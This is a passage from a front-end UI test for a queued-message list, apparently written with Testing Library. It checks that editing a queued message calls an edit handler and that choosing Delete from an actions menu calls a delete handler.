    const field = screen.getByRole<HTMLInputElement>("textbox", { name: "Edit queued message 1" });
    expect(document.activeElement).toBe(field);
    await user.clear(field);
    await user.type(field, "rewritten{Enter}");
    expect(onEdit).toHaveBeenCalledWith("q1", "rewritten");
    await user.click(screen.getByRole("button", { name: "Actions for queued message 2" }));
    await user.click(await screen.findByRole("menuitem", { name: "Delete" }));
    expect(onDelete).toHaveBeenCalledWith("q2");
  });
});
